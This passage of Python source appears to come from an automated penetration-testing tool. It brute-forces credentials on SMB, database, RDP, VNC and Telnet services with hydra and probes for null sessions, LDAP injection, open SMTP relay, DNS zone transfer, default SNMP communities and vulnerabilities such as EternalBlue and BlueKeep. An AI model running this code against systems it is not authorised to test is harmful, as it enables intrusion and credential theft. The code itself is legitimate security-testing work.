            
            vulnerabilities = []
            if result.stdout:
                output_lower = result.stdout.lower()
                
                # Check for interesting findings
                if 'share enumeration' in output_lower and 'accessible' in output_lower:
                    vulnerabilities.append({
                        'type': 'smb_shares_accessible',
                        'severity': 'medium',
                        'description': 'Accessible SMB shares found'
                    })
                
                if 'user enumeration' in output_lower:
                    vulnerabilities.append({
                        'type': 'smb_user_enumeration',
                        'severity': 'low',
                        'description': 'SMB user enumeration possible'
                    })
                
                # Check for specific SMB/NetBIOS information
                if 'netbios' in output_lower or 'workgroup' in output_lower:
                    vulnerabilities.append({
                        'type': 'netbios_information',
                        'severity': 'info',
                        'description': 'NetBIOS information disclosed'
                    })
            
            # Prepare result
            enum_result = {
                'success': len(vulnerabilities) > 0,
                'vulnerabilities': vulnerabilities,
                'original_port': port,
                'output': result.stdout
            }
            
            # Cache the result for future use
            self._smb_enumeration_cache[cache_key] = enum_result.copy()
            
            self.evidence.collect_evidence(
                'smb_enumeration', 'enum4linux', ' '.join(cmd),
                result.stdout + result.stderr, len(vulnerabilities) > 0
            )
            
            return enum_result
            
        except Exception as e:
            self.logger.error(f"SMB enumeration failed: {e}")
            return {'success': False, 'error': str(e)}
    
    def _test_smb_null_session(self, port: int, service_info: Dict) -> Dict:
        """Test SMB null session"""
        try:
            cmd = ['smbclient', '-L', f'//{self.target_ip}', '-N']
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            success = (result.returncode == 0 and 'Sharename' in result.stdout)
            
            self.evidence.collect_evidence(
                'smb_null_session', 'smbclient', ' '.join(cmd),
                result.stdout + result.stderr, success
            )
            
            return {'success': success}
            
        except Exception as e:
            self.logger.error(f"SMB null session test failed: {e}")
            return {'success': False, 'error': str(e)}
    
    def _brute_force_smb(self, port: int, service_info: Dict) -> Dict:
        """Brute force SMB credentials"""
        try:
            userlist = CONFIG['wordlists']['usernames']
            passlist = CONFIG['wordlists']['passwords']
            
            if not os.path.exists(userlist):
                userlist = '/usr/share/wordlists/metasploit/unix_users.txt'
            if not os.path.exists(passlist):
                passlist = '/usr/share/wordlists/rockyou.txt'
            
            cmd = [
                'hydra',
                '-L', userlist,
                '-P', passlist,
                '-t', '1',
                '-f',
                f'{self.target_ip}',
                'smb'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            credentials = []
            if 'login:' in result.stdout and 'password:' in result.stdout:
                for line in result.stdout.split('\n'):
                    if 'login:' in line and 'password:' in line:
                        parts = line.split()
                        if len(parts) >= 4:
                            username = parts[parts.index('login:') + 1]
                            password = parts[parts.index('password:') + 1]
                            credentials.append({
                                'username': username,
                                'password': password,
                                'service': 'smb'
                            })
            
            self.evidence.collect_evidence(
                'smb_brute_force', 'hydra', ' '.join(cmd),
                result.stdout + result.stderr, len(credentials) > 0
            )
            
            return {
                'success': len(credentials) > 0,
                'credentials': credentials
            }
            
        except Exception as e:
            self.logger.error(f"SMB brute force failed: {e}")
            return {'success': False, 'error': str(e)}
    
    def _test_eternalblue(self, port: int, service_info: Dict) -> Dict:
        """Test for EternalBlue vulnerability"""
        try:
            cmd = [
                'nmap',
                '-p', str(port),
                '--script', 'smb-vuln-ms17-010',
                self.target_ip
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            success = ('VULNERABLE' in result.stdout and 'MS17-010' in result.stdout)
            
            self.evidence.collect_evidence(
                'eternalblue_test', 'nmap', ' '.join(cmd),
                result.stdout + result.stderr, success
            )
            
            return {'success': success}
            
        except Exception as e:
            self.logger.error(f"EternalBlue test failed: {e}")
            return {'success': False, 'error': str(e)}
    
    def _run_nuclei_generic(self, port: int, service_info: Dict) -> Dict:
        """Run generic nuclei scan"""
        try:
            cmd = [
                'nuclei',
                '-u', f'{self.target_ip}:{port}',
                '-severity', 'medium,high,critical',
                '-timeout', '10',
                '-retries', '1',
                '-json'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            vulnerabilities = []
            if result.stdout:
                for line in result.stdout.split('\n'):
                    if line.strip():
                        try:
                            vuln_data = json.loads(line)
                            vulnerabilities.append({
                                'type': 'nuclei_finding',
                                'severity': vuln_data.get('info', {}).get('severity', 'medium'),
                                'description': vuln_data.get('info', {}).get('name', 'Unknown vulnerability'),
                                'template': vuln_data.get('template-id', ''),
                                'matched_at': vuln_data.get('matched-at', '')
                            })
                        except json.JSONDecodeError:
                            continue
            
            self.evidence.collect_evidence(
                'nuclei_generic_scan', 'nuclei', ' '.join(cmd),
                result.stdout + result.stderr, len(vulnerabilities) > 0
            )
            
            return {
                'success': len(vulnerabilities) > 0,
                'vulnerabilities': vulnerabilities
            }
            
        except Exception as e:
            self.logger.error(f"Generic nuclei scan failed: {e}")
            return {'success': False, 'error': str(e)}
    
    def _grab_banner(self, port: int, service_info: Dict) -> Dict:
        """Grab service banner"""
        try:
            cmd = ['nc', '-nv', self.target_ip, str(port)]
            
            result = subprocess.run(
                cmd, input='\n', capture_output=True, text=True, timeout=10
            )
            
            vulnerabilities = []
            if result.stdout or result.stderr:
                banner = result.stdout + result.stderr
                
                # Check for version information that might indicate vulnerabilities
                if any(keyword in banner.lower() for keyword in ['version', 'server', 'apache', 'nginx', 'iis']):
                    vulnerabilities.append({
                        'type': 'banner_disclosure',
                        'severity': 'low',
                        'description': f'Service banner disclosed: {banner.strip()[:100]}...'
                    })
            
            self.evidence.collect_evidence(
                'banner_grab', 'netcat', ' '.join(cmd),
                result.stdout + result.stderr, len(vulnerabilities) > 0
            )
            
            return {
                'success': len(vulnerabilities) > 0,
                'vulnerabilities': vulnerabilities
            }
            
        except Exception as e:
            self.logger.error(f"Banner grab failed: {e}")
            return {'success': False, 'error': str(e)}
    
    # Add placeholder methods for other services (can be implemented later)
    def _enumerate_smtp_users(self, port: int, service_info: Dict) -> Dict:
        """Enumerate SMTP users using VRFY and EXPN commands"""
        try:
            common_users = ['admin', 'administrator', 'root', 'test', 'guest', 'mail', 'postmaster']
            found_users = []
            
            for user in common_users:
                try:
                    # Test VRFY command
                    cmd = ['nc', '-w', '3', self.target_ip, str(port)]
                    smtp_commands = f"VRFY {user}\nQUIT\n"
                    
                    result = subprocess.run(
                        cmd, input=smtp_commands, capture_output=True, text=True, timeout=10
                    )
                    
                    if '250' in result.stdout or '252' in result.stdout:
                        found_users.append(user)
                        
                except subprocess.TimeoutExpired:
                    continue
            
            vulnerabilities = []
            if found_users:
                vulnerabilities.append({
                    'type': 'smtp_user_enumeration',
                    'severity': 'medium',
                    'description': f'SMTP users enumerated: {", ".join(found_users)}'
                })
            
            self.evidence.collect_evidence(
                'smtp_user_enumeration', 'netcat', 'VRFY enumeration',
                f'Found users: {found_users}', len(found_users) > 0
            )
            
            return {
                'success': len(found_users) > 0,
                'vulnerabilities': vulnerabilities,
                'users': found_users
            }
            
        except Exception as e:
            self.logger.error(f"SMTP user enumeration failed: {e}")
            return {'success': False, 'vulnerabilities': []}
    
    def _test_smtp_open_relay(self, port: int, service_info: Dict) -> Dict:
        """Test SMTP open relay vulnerability"""
        try:
            cmd = ['nc', '-w', '5', self.target_ip, str(port)]
            
            # SMTP commands to test open relay
            smtp_commands = """HELO test.com
MAIL FROM: test@external.com
RCPT TO: victim@target.com
DATA
Subject: Relay Test
This is a relay test.
.
QUIT
"""
            
            result = subprocess.run(
                cmd, input=smtp_commands, capture_output=True, text=True, timeout=30
            )
            
            # Check if relay was accepted
            success = ('250' in result.stdout and 'OK' in result.stdout and 
                      not any(reject in result.stdout.lower() for reject in ['reject', 'deny', 'refuse']))
            
            self.evidence.collect_evidence(
                'smtp_open_relay_test', 'netcat', ' '.join(cmd),
                result.stdout + result.stderr, success
            )
            
            return {'success': success}
            
        except Exception as e:
            self.logger.error(f"SMTP open relay test failed: {e}")
            return {'success': False}
    
    def _test_dns_zone_transfer(self, port: int, service_info: Dict) -> Dict:
        """Test DNS zone transfer (AXFR)"""
        try:
            # Try to get domain name from reverse DNS
            try:
                import socket
                domain = socket.gethostbyaddr(self.target_ip)[0]
            except:
                # Use common domain patterns
                domain = f"domain.local"
            
            cmd = ['dig', '@' + self.target_ip, domain, 'AXFR']
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            # Check if zone transfer was successful
            success = (result.returncode == 0 and 
                      'ANSWER SECTION' in result.stdout and 
                      len(result.stdout.split('\n')) > 10)
            
            self.evidence.collect_evidence(
                'dns_zone_transfer', 'dig', ' '.join(cmd),
                result.stdout + result.stderr, success
            )
            
            return {'success': success}
            
        except Exception as e:
            self.logger.error(f"DNS zone transfer test failed: {e}")
            return {'success': False}
    
    def _test_dns_cache_poisoning(self, port: int, service_info: Dict) -> Dict:
        """Test DNS cache poisoning vulnerability"""
        try:
            # Test for DNS recursion
            cmd = ['dig', '@' + self.target_ip, 'google.com', 'A']
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            
            # Check if recursion is enabled
            success = (result.returncode == 0 and 
                      'ANSWER SECTION' in result.stdout and
                      'google.com' in result.stdout)
            
            self.evidence.collect_evidence(
                'dns_recursion_test', 'dig', ' '.join(cmd),
                result.stdout + result.stderr, success
            )
            
            return {'success': success}
            
        except Exception as e:
            self.logger.error(f"DNS cache poisoning test failed: {e}")
            return {'success': False}
    
    def _brute_force_snmp_community(self, port: int, service_info: Dict) -> Dict:
        """Brute force SNMP community strings"""
        try:
            # Common SNMP community strings
            communities = ['public', 'private', 'community', 'manager', 'admin', 'snmp', 'read', 'write']
            found_communities = []
            
            for community in communities:
                try:
                    cmd = ['snmpwalk', '-v2c', '-c', community, self.target_ip, '1.3.6.1.2.1.1.1.0']
                    
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                    
                    if result.returncode == 0 and 'iso.' in result.stdout:
                        found_communities.append(community)
                        
                except subprocess.TimeoutExpired:
                    continue
            
            credentials = []
            for community in found_communities:
                credentials.append({
                    'community': community,
                    'service': 'snmp',
                    'access_level': 'read' if community in ['public', 'read'] else 'write'
                })
            
            self.evidence.collect_evidence(
                'snmp_community_brute', 'snmpwalk', 'community_bruteforce',
                f'Found communities: {found_communities}', len(found_communities) > 0
            )
            
            return {
                'success': len(found_communities) > 0,
                'credentials': credentials
            }
            
        except Exception as e:
            self.logger.error(f"SNMP community brute force failed: {e}")
            return {'success': False, 'credentials': []}
    
    def _enumerate_snmp(self, port: int, service_info: Dict) -> Dict:
        """Enumerate SNMP information"""
        try:
            # Try with common community strings
            communities = ['public', 'private']
            vulnerabilities = []
            
            for community in communities:
                try:
                    # Get system information
                    cmd = ['snmpwalk', '-v2c', '-c', community, self.target_ip, '1.3.6.1.2.1.1']
                    
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                    
                    if result.returncode == 0 and result.stdout:
                        vulnerabilities.append({
                            'type': 'snmp_information_disclosure',
                            'severity': 'medium',
                            'description': f'SNMP information accessible with community: {community}'
                        })
                        
                        # Check for sensitive information
                        if any(keyword in result.stdout.lower() for keyword in 
                              ['windows', 'linux', 'cisco', 'version', 'user']):
                            vulnerabilities.append({
                                'type': 'snmp_sensitive_info',
                                'severity': 'medium',
                                'description': 'Sensitive system information disclosed via SNMP'
                            })
                        break
                        
                except subprocess.TimeoutExpired:
                    continue
            
            self.evidence.collect_evidence(
                'snmp_enumeration', 'snmpwalk', 'snmp_enum',
                f'Found {len(vulnerabilities)} vulnerabilities', len(vulnerabilities) > 0
            )
            
            return {
                'success': len(vulnerabilities) > 0,
                'vulnerabilities': vulnerabilities
            }
            
        except Exception as e:
            self.logger.error(f"SNMP enumeration failed: {e}")
            return {'success': False, 'vulnerabilities': []}
    
    def _test_ldap_anonymous_bind(self, port: int, service_info: Dict) -> Dict:
        """Test LDAP anonymous bind"""
        try:
            cmd = ['ldapsearch', '-x', '-h', self.target_ip, '-p', str(port), '-b', '', '-s', 'base']
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            success = (result.returncode == 0 and 'numEntries:' in result.stdout)
            
            self.evidence.collect_evidence(
                'ldap_anonymous_bind', 'ldapsearch', ' '.join(cmd),
                result.stdout + result.stderr, success
            )
            
            return {'success': success}
            
        except Exception as e:
            self.logger.error(f"LDAP anonymous bind test failed: {e}")
            return {'success': False}
    
    def _test_ldap_injection(self, port: int, service_info: Dict) -> Dict:
        """Test LDAP injection vulnerability"""
        try:
            # Basic LDAP injection payloads
            payloads = ['*', '*)(&', '*))%00', '*()|%26']
            
            for payload in payloads:
                try:
                    cmd = ['ldapsearch', '-x', '-h', self.target_ip, '-p', str(port), 
                          '-b', 'dc=test,dc=com', f'(cn={payload})']
                    
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
                    
                    # Check for injection indicators
                    if ('numEntries:' in result.stdout and 
                        int(result.stdout.split('numEntries: ')[1].split('\n')[0]) > 0):
                        
                        self.evidence.collect_evidence(
                            'ldap_injection_test', 'ldapsearch', ' '.join(cmd),
                            result.stdout + result.stderr, True
                        )
                        
                        return {'success': True}
                        
                except subprocess.TimeoutExpired:
                    continue
            
            return {'success': False}
            
        except Exception as e:
            self.logger.error(f"LDAP injection test failed: {e}")
            return {'success': False}
    
    def _check_mysql_version(self, port: int, service_info: Dict) -> Dict:
        """Check MySQL version for vulnerabilities"""
        try:
            cmd = ['nmap', '-p', str(port), '--script', 'mysql-info', self.target_ip]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            vulnerabilities = []
            if result.stdout:
                # Check for version information
                if 'Version:' in result.stdout:
                    version_line = [line for line in result.stdout.split('\n') if 'Version:' in line][0]
                    
                    # Check for known vulnerable versions
                    if any(vuln_version in version_line for vuln_version in ['5.0', '5.1', '5.5']):
                        vulnerabilities.append({
                            'type': 'mysql_version_vulnerability',
                            'severity': 'medium',
                            'description': f'Potentially vulnerable MySQL version: {version_line.strip()}'
                        })
            
            self.evidence.collect_evidence(
                'mysql_version_check', 'nmap', ' '.join(cmd),
                result.stdout + result.stderr, len(vulnerabilities) > 0
            )
            
            return {
                'success': len(vulnerabilities) > 0,
                'vulnerabilities': vulnerabilities
            }
            
        except Exception as e:
            self.logger.error(f"MySQL version check failed: {e}")
            return {'success': False, 'vulnerabilities': []}
    
    def _brute_force_mysql(self, port: int, service_info: Dict) -> Dict:
        """Brute force MySQL credentials"""
        try:
            userlist = CONFIG['wordlists']['usernames']
            passlist = CONFIG['wordlists']['passwords']
            
            if not os.path.exists(userlist):
                userlist = '/usr/share/wordlists/metasploit/unix_users.txt'
            if not os.path.exists(passlist):
                passlist = '/usr/share/wordlists/rockyou.txt'
            
            cmd = [
                'hydra',
                '-L', userlist,
                '-P', passlist,
                '-t', '4',
                '-f',
                f'{self.target_ip}',
                '-s', str(port),
                'mysql'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            credentials = []
            if 'login:' in result.stdout and 'password:' in result.stdout:
                for line in result.stdout.split('\n'):
                    if 'login:' in line and 'password:' in line:
                        parts = line.split()
                        if len(parts) >= 4:
                            username = parts[parts.index('login:') + 1]
                            password = parts[parts.index('password:') + 1]
                            credentials.append({
                                'username': username,
                                'password': password,
                                'service': 'mysql'
                            })
            
            self.evidence.collect_evidence(
                'mysql_brute_force', 'hydra', ' '.join(cmd),
                result.stdout + result.stderr, len(credentials) > 0
            )
            
            return {
                'success': len(credentials) > 0,
                'credentials': credentials
            }
            
        except Exception as e:
            self.logger.error(f"MySQL brute force failed: {e}")
            return {'success': False, 'credentials': []}
    
    def _test_mysql_udf(self, port: int, service_info: Dict) -> Dict:
        """Test MySQL UDF (User Defined Function) exploitation"""
        try:
            # This would require valid credentials, so it's a basic test
            cmd = ['nmap', '-p', str(port), '--script', 'mysql-vuln-cve2012-2122', self.target_ip]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            success = ('VULNERABLE' in result.stdout)
            
            self.evidence.collect_evidence(
                'mysql_udf_test', 'nmap', ' '.join(cmd),
                result.stdout + result.stderr, success
            )
            
            return {'success': success}
            
        except Exception as e:
            self.logger.error(f"MySQL UDF test failed: {e}")
            return {'success': False}
    
    def _brute_force_postgresql(self, port: int, service_info: Dict) -> Dict:
        """Brute force PostgreSQL credentials"""
        try:
            userlist = CONFIG['wordlists']['usernames']
            passlist = CONFIG['wordlists']['passwords']
            
            if not os.path.exists(userlist):
                userlist = '/usr/share/wordlists/metasploit/unix_users.txt'
            if not os.path.exists(passlist):
                passlist = '/usr/share/wordlists/rockyou.txt'
            
            cmd = [
                'hydra',
                '-L', userlist,
                '-P', passlist,
                '-t', '4',
                '-f',
                f'{self.target_ip}',
                '-s', str(port),
                'postgres'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            credentials = []
            if 'login:' in result.stdout and 'password:' in result.stdout:
                for line in result.stdout.split('\n'):
                    if 'login:' in line and 'password:' in line:
                        parts = line.split()
                        if len(parts) >= 4:
                            username = parts[parts.index('login:') + 1]
                            password = parts[parts.index('password:') + 1]
                            credentials.append({
                                'username': username,
                                'password': password,
                                'service': 'postgresql'
                            })
            
            self.evidence.collect_evidence(
                'postgresql_brute_force', 'hydra', ' '.join(cmd),
                result.stdout + result.stderr, len(credentials) > 0
            )
            
            return {
                'success': len(credentials) > 0,
                'credentials': credentials
            }
            
        except Exception as e:
            self.logger.error(f"PostgreSQL brute force failed: {e}")
            return {'success': False, 'credentials': []}
    
    def _test_postgresql_privesc(self, port: int, service_info: Dict) -> Dict:
        """Test PostgreSQL privilege escalation"""
        try:
            # Test for common PostgreSQL vulnerabilities
            cmd = ['nmap', '-p', str(port), '--script', 'pgsql-brute,pgsql-databases', self.target_ip]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            success = ('Valid credentials' in result.stdout or 'databases:' in result.stdout)
            
            self.evidence.collect_evidence(
                'postgresql_privesc_test', 'nmap', ' '.join(cmd),
                result.stdout + result.stderr, success
            )
            
            return {'success': success}
            
        except Exception as e:
            self.logger.error(f"PostgreSQL privilege escalation test failed: {e}")
            return {'success': False}
    
    def _brute_force_mssql(self, port: int, service_info: Dict) -> Dict:
        """Brute force MSSQL credentials"""
        try:
            userlist = CONFIG['wordlists']['usernames']
            passlist = CONFIG['wordlists']['passwords']
            
            if not os.path.exists(userlist):
                userlist = '/usr/share/wordlists/metasploit/unix_users.txt'
            if not os.path.exists(passlist):
                passlist = '/usr/share/wordlists/rockyou.txt'
            
            cmd = [
                'hydra',
                '-L', userlist,
                '-P', passlist,
                '-t', '4',
                '-f',
                f'{self.target_ip}',
                '-s', str(port),
                'mssql'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            credentials = []
            if 'login:' in result.stdout and 'password:' in result.stdout:
                for line in result.stdout.split('\n'):
                    if 'login:' in line and 'password:' in line:
                        parts = line.split()
                        if len(parts) >= 4:
                            username = parts[parts.index('login:') + 1]
                            password = parts[parts.index('password:') + 1]
                            credentials.append({
                                'username': username,
                                'password': password,
                                'service': 'mssql'
                            })
            
            self.evidence.collect_evidence(
                'mssql_brute_force', 'hydra', ' '.join(cmd),
                result.stdout + result.stderr, len(credentials) > 0
            )
            
            return {
                'success': len(credentials) > 0,
                'credentials': credentials
            }
            
        except Exception as e:
            self.logger.error(f"MSSQL brute force failed: {e}")
            return {'success': False, 'credentials': []}
    
    def _test_mssql_xp_cmdshell(self, port: int, service_info: Dict) -> Dict:
        """Test MSSQL xp_cmdshell functionality"""
        try:
            # Test for xp_cmdshell using nmap scripts
            cmd = ['nmap', '-p', str(port), '--script', 'ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell', self.target_ip]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            success = ('xp_cmdshell' in result.stdout and 'enabled' in result.stdout.lower())
            
            self.evidence.collect_evidence(
                'mssql_xp_cmdshell_test', 'nmap', ' '.join(cmd),
                result.stdout + result.stderr, success
            )
            
            return {'success': success}
            
        except Exception as e:
            self.logger.error(f"MSSQL xp_cmdshell test failed: {e}")
            return {'success': False}
    
    def _brute_force_rdp(self, port: int, service_info: Dict) -> Dict:
        """Brute force RDP credentials"""
        try:
            userlist = CONFIG['wordlists']['usernames']
            passlist = CONFIG['wordlists']['passwords']
            
            if not os.path.exists(userlist):
                userlist = '/usr/share/wordlists/metasploit/unix_users.txt'
            if not os.path.exists(passlist):
                passlist = '/usr/share/wordlists/rockyou.txt'
            
            cmd = [
                'hydra',
                '-L', userlist,
                '-P', passlist,
                '-t', '1',  # RDP is sensitive to connection limits
                '-f',
                f'{self.target_ip}',
                '-s', str(port),
                'rdp'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            
            credentials = []
            if 'login:' in result.stdout and 'password:' in result.stdout:
                for line in result.stdout.split('\n'):
                    if 'login:' in line and 'password:' in line:
                        parts = line.split()
                        if len(parts) >= 4:
                            username = parts[parts.index('login:') + 1]
                            password = parts[parts.index('password:') + 1]
                            credentials.append({
                                'username': username,
                                'password': password,
                                'service': 'rdp'
                            })
            
            self.evidence.collect_evidence(
                'rdp_brute_force', 'hydra', ' '.join(cmd),
                result.stdout + result.stderr, len(credentials) > 0
            )
            
            return {
                'success': len(credentials) > 0,
                'credentials': credentials
            }
            
        except Exception as e:
            self.logger.error(f"RDP brute force failed: {e}")
            return {'success': False, 'credentials': []}
    
    def _test_bluekeep(self, port: int, service_info: Dict) -> Dict:
        """Test for BlueKeep (CVE-2019-0708) vulnerability"""
        try:
            cmd = ['nmap', '-p', str(port), '--script', 'rdp-vuln-ms12-020,rdp-enum-encryption', self.target_ip]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            # Check for BlueKeep indicators
            success = ('VULNERABLE' in result.stdout or 'CVE-2019-0708' in result.stdout)
            
            self.evidence.collect_evidence(
                'bluekeep_test', 'nmap', ' '.join(cmd),
                result.stdout + result.stderr, success
            )
            
            return {'success': success}
            
        except Exception as e:
            self.logger.error(f"BlueKeep test failed: {e}")
            return {'success': False}
    
    def _brute_force_vnc(self, port: int, service_info: Dict) -> Dict:
        """Brute force VNC passwords"""
        try:
            passlist = CONFIG['wordlists']['passwords']
            
            if not os.path.exists(passlist):
                passlist = '/usr/share/wordlists/rockyou.txt'
            
            cmd = [
                'hydra',
                '-P', passlist,
                '-t', '4',
                '-f',
                f'{self.target_ip}',
                '-s', str(port),
                'vnc'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            credentials = []
            if 'password:' in result.stdout:
                for line in result.stdout.split('\n'):
                    if 'password:' in line:
                        parts = line.split()
                        if len(parts) >= 2:
                            password = parts[parts.index('password:') + 1]
                            credentials.append({
                                'password': password,
                                'service': 'vnc'
                            })
            
            self.evidence.collect_evidence(
                'vnc_brute_force', 'hydra', ' '.join(cmd),
                result.stdout + result.stderr, len(credentials) > 0
            )
            
            return {
                'success': len(credentials) > 0,
                'credentials': credentials
            }
            
        except Exception as e:
            self.logger.error(f"VNC brute force failed: {e}")
            return {'success': False, 'credentials': []}
    
    def _test_vnc_no_auth(self, port: int, service_info: Dict) -> Dict:
        """Test VNC for no authentication"""
        try:
            cmd = ['nmap', '-p', str(port), '--script', 'vnc-info,vnc-brute', self.target_ip]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            success = ('Authentication: none' in result.stdout or 'No authentication' in result.stdout)
            
            self.evidence.collect_evidence(
                'vnc_no_auth_test', 'nmap', ' '.join(cmd),
                result.stdout + result.stderr, success
            )
            
            return {'success': success}
            
        except Exception as e:
            self.logger.error(f"VNC no auth test failed: {e}")
            return {'success': False}
    
    def _enumerate_rpc(self, port: int, service_info: Dict) -> Dict:
        """Enumerate RPC services"""
        try:
            cmd = ['rpcinfo', '-p', self.target_ip]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            vulnerabilities = []
            if result.returncode == 0 and result.stdout:
                services = result.stdout.split('\n')
                for service in services:
                    if 'tcp' in service or 'udp' in service:
                        vulnerabilities.append({
                            'type': 'rpc_service_enumeration',
                            'severity': 'low',
                            'description': f'RPC service exposed: {service.strip()}'
                        })
            
            self.evidence.collect_evidence(
                'rpc_enumeration', 'rpcinfo', ' '.join(cmd),
                result.stdout + result.stderr, len(vulnerabilities) > 0
            )
            
            return {
                'success': len(vulnerabilities) > 0,
                'vulnerabilities': vulnerabilities
            }
            
        except Exception as e:
            self.logger.error(f"RPC enumeration failed: {e}")
            return {'success': False, 'vulnerabilities': []}
    
    def _test_rpc_null_session(self, port: int, service_info: Dict) -> Dict:
        """Test RPC null session"""
        try:
            cmd = ['rpcclient', '-U', '""', '-N', self.target_ip]
            
            result = subprocess.run(cmd, input='quit\n', capture_output=True, text=True, timeout=30)
            
            success = ('rpcclient $>' in result.stdout or result.returncode == 0)
            
            self.evidence.collect_evidence(
                'rpc_null_session_test', 'rpcclient', ' '.join(cmd),
                result.stdout + result.stderr, success
            )
            
            return {'success': success}
            
        except Exception as e:
            self.logger.error(f"RPC null session test failed: {e}")
            return {'success': False}

    # Additional service-specific methods
    def _brute_force_telnet(self, port: int, service_info: Dict) -> Dict:
        """Brute force Telnet credentials"""
        try:
            userlist = CONFIG['wordlists']['usernames']
            passlist = CONFIG['wordlists']['passwords']
            
            if not os.path.exists(userlist):
                userlist = '/usr/share/wordlists/metasploit/unix_users.txt'
            if not os.path.exists(passlist):
                passlist = '/usr/share/wordlists/rockyou.txt'
            
            cmd = [
                'hydra',
                '-L', userlist,
                '-P', passlist,
                '-t', '4',
                '-f',
                f'{self.target_ip}',
                '-s', str(port),
                'telnet'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            credentials = []
            if 'login:' in result.stdout and 'password:' in result.stdout:
                for line in result.stdout.split('\n'):
                    if 'login:' in line and 'password:' in line:
                        parts = line.split()
                        if len(parts) >= 4:
                            username = parts[parts.index('login:') + 1]
                            password = parts[parts.index('password:') + 1]
                            credentials.append({
                                'username': username,
                                'password': password,
                                'service': 'telnet'
                            })
            
            self.evidence.collect_evidence(
                'telnet_brute_force', 'hydra', ' '.join(cmd),
                result.stdout + result.stderr, len(credentials) > 0
            )
            
            return {
                'success': len(credentials) > 0,
                'credentials': credentials
            }
            
        except Exception as e:
            self.logger.error(f"Telnet brute force failed: {e}")
            return {'success': False, 'credentials': []}
    
    def _test_nfs_shares(self, port: int, service_info: Dict) -> Dict:
        """Test NFS shares for misconfigurations"""
        try:
            cmd = ['showmount', '-e', self.target_ip]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            vulnerabilities = []
            if result.returncode == 0 and result.stdout:
                shares = result.stdout.split('\n')[1:]  # Skip header
                for share in shares:
                    if share.strip():
                        vulnerabilities.append({
                            'type': 'nfs_share_exposed',
                            'severity': 'medium',
                            'description': f'NFS share exposed: {share.strip()}'
                        })
            
            self.evidence.collect_evidence(
                'nfs_shares_test', 'showmount', ' '.join(cmd),
                result.stdout + result.stderr, len(vulnerabilities) > 0
            )
            
            return {
                'success': len(vulnerabilities) > 0,
                'vulnerabilities': vulnerabilities
            }
            
        except Exception as e:
            self.logger.error(f"NFS shares test failed: {e}")
            return {'success': False, 'vulnerabilities': []}
    
    def _test_tftp_access(self, port: int, service_info: Dict) -> Dict:
        """Test TFTP access and file retrieval"""
        try:
            # Try to retrieve common files
            test_files = ['config.txt', 'startup-config', 'running-config', 'boot.ini']
            
            for filename in test_files:
                try:
                    cmd = ['tftp', self.target_ip, '-c', 'get', filename]
                    
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
                    
                    if result.returncode == 0:
                        self.evidence.collect_evidence(
                            'tftp_file_access', 'tftp', ' '.join(cmd),
                            f'Successfully retrieved: {filename}', True
                        )
                        return {'success': True}
                        
                except subprocess.TimeoutExpired:
                    continue
            
            return {'success': False}
            
        except Exception as e:
            self.logger.error(f"TFTP access test failed: {e}")
            return {'success': False}
    
    def _test_irc_server(self, port: int, service_info: Dict) -> Dict:
        """Test IRC server for information disclosure"""
        try:
            cmd = ['nc', '-w', '5', self.target_ip, str(port)]
            irc_commands = "NICK testuser\nUSER test test test :test\nLUSERS\nVERSION\nQUIT\n"
            
            result = subprocess.run(
                cmd, input=irc_commands, capture_output=True, text=True, timeout=30
            )
            
            success = ('LUSERS' in result.stdout or 'VERSION' in result.stdout)
            
            self.evidence.collect_evidence(
                'irc_server_test', 'netcat', ' '.join(cmd),
                result.stdout + result.stderr, success
            )
            
            return {'success': success}
            
        except Exception as e:
            self.logger.error(f"IRC server test failed: {e}")
            return {'success': False}
    
    def _test_finger_service(self, port: int, service_info: Dict) -> Dict:
        """Test Finger service for user enumeration"""
        try:
            common_users = ['root', 'admin', 'administrator', 'guest', 'user', 'test']
            found_users = []
            
            for user in common_users:
                try:
                    cmd = ['finger', f'{user}@{self.target_ip}']
                    
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                    
                    if result.returncode == 0 and result.stdout:
                        found_users.append(user)
                        
                except subprocess.TimeoutExpired:
                    continue
            
            self.evidence.collect_evidence(
                'finger_user_enum', 'finger', 'user_enumeration',
                f'Found users: {found_users}', len(found_users) > 0
            )
            
            return {
                'success': len(found_users) > 0,
                'users': found_users
            }
            
        except Exception as e:
            self.logger.error(f"Finger service test failed: {e}")
            return {'success': False, 'users': []}
    
    # Post-exploitation methods
    def _attempt_privilege_escalation(self, service: str, credentials: Dict) -> Dict:
        """Attempt privilege escalation after successful exploitation"""
        try:
            escalation_results = []
            
            # Linux privilege escalation techniques
            if service in ['ssh', 'telnet']:
                # Check for sudo privileges
                if 'username' in credentials and 'password' in credentials:
                    # This would require actual SSH connection - placeholder for now
                    escalation_results.append({
                        'technique': 'sudo_check',
                        'status': 'attempted',
                        'description': 'Checked for sudo privileges'
                    })
            
